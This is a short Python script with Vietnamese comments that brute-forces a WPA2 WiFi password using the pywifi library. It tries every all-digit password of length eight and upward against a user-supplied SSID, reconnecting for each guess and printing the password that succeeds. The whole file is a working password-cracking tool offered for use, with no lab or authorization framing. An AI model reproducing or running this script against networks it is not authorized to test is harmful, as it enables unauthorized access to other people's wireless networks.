import itertools
import string
import time
import pywifi
from pywifi import PyWiFi, Profile, const


def crack_wifi(ssid, max_digits=8):
    wifi = PyWiFi()
    # Lấy card mạng wireless đầu tiên
    iface = wifi.interfaces()[0]

    print(f"Đang bắt đầu dò mật khẩu cho WiFi: {ssid}")

    # Thử độ dài mật khẩu từ 8 chữ số trở lên (mật khẩu WPA/WPA2 tối thiểu 8 ký tự)
    for length in range(8, max_digits + 1):
        print(f"--- Đang thử độ dài {length} chữ số ---")

        # Tạo tất cả các tổ hợp chuỗi số
        for p in itertools.product(string.digits, repeat=length):
            password = "".join(p)

            # Ngắt tất cả kết nối hiện tại
            iface.disconnect()
            time.sleep(0.1)

            # Tạo profile kết nối mới
            profile = Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            # Xóa các profile cũ và thêm profile mới
            iface.remove_all_network_profiles()
            temp_profile = iface.add_network_profile(profile)

            # Thử kết nối
            iface.connect(temp_profile)
            time.sleep(1.5)  # Chờ thời gian xác thực

            # Kiểm tra trạng thái kết nối
            if iface.status() == const.IFACE_CONNECTED:
                print(f"\n[Thành công] Mật khẩu đúng là: {password}")
                return password
            else:
                print(f"Thử: {password} -> Thất bại", end="\r")

    print("\nKhông tìm thấy mật khẩu trong dải số đã chọn.")
    return None


if __name__ == "__main__":
    wifi_name = input("Nhập tên WiFi (SSID): ")
    crack_wifi(wifi_name, max_digits=8)
